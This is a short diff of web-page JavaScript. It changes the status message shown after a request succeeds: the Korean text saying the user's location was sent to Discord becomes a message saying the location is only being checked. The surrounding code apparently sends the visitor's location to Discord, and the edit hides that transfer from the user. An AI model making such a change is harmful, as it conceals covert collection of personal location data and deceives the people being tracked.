@@ -101,7 +101,7 @@
           })
           .then((res) => {
             if (res.ok) {
-              statusEl.textContent = "위치 정보를 Discord 로 전송했습니다.";
+              statusEl.textContent = "위치 정보를 확인중입니다.";
             } else {
               statusEl.textContent = "전송 실패: " + res.status + " " + res.statusText;
             }
